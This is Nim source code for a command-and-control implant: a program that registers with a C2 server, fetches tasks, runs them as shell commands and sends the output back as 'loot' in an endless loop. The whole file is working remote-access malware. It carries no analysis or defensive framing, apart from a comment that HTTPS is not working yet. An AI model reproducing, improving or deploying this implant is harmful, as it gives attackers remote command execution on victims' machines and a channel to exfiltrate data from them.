# nim c -d:ssl -d:release --opt:speed implant.nim
import uuid
import std/httpclient
import std/strformat
import std/net
import std/json
import std/osproc
import std/os

var 
  IMPLANT_ID = uuid()
  C2_BASEURL = "http://0.0.0.0:8080" # HTTPS is not working yet. I get SSL errors
  client: HttpClient

proc checkin() =
  let body = %*{
      "uuid": fmt"{IMPLANT_ID}"  
  }
  let response = client.request(fmt"{C2_BASEURL}/checkin", httpMethod = HttpPost, body = $body).body
  echo response


proc tasks(): JsonNode =
  let response = client.request(fmt"{C2_BASEURL}/tasks?uuid={IMPLANT_ID}", httpMethod = HttpGet).body
  return parseJson(response)

proc loot(result: string) =
  let body = %*{
      "uuid": fmt"{IMPLANT_ID}",
      "loot": $result
  }
  let response = client.request(fmt"{C2_BASEURL}/loot", httpMethod = HttpPost, body = $body).body
  echo response  

proc executeCommand(cmd: string): string =
  var result = ""
  for line in lines(execProcess(cmd, options = {poUsePath, poStdErrToStdOut})):
    result.add(line & "\n")
  return result

when isMainModule:
  client = newHttpClient()
  client.headers = newHttpHeaders({"Content-Type": "application/json"})
  checkin()

  while true:
    let tasks = tasks()
    if tasks.len == 0:
      continue
    else:
      for task in tasks.getElems():
        let command = task.getStr()
        let result = executeCommand(command)
        loot(result)
        sleep(10000)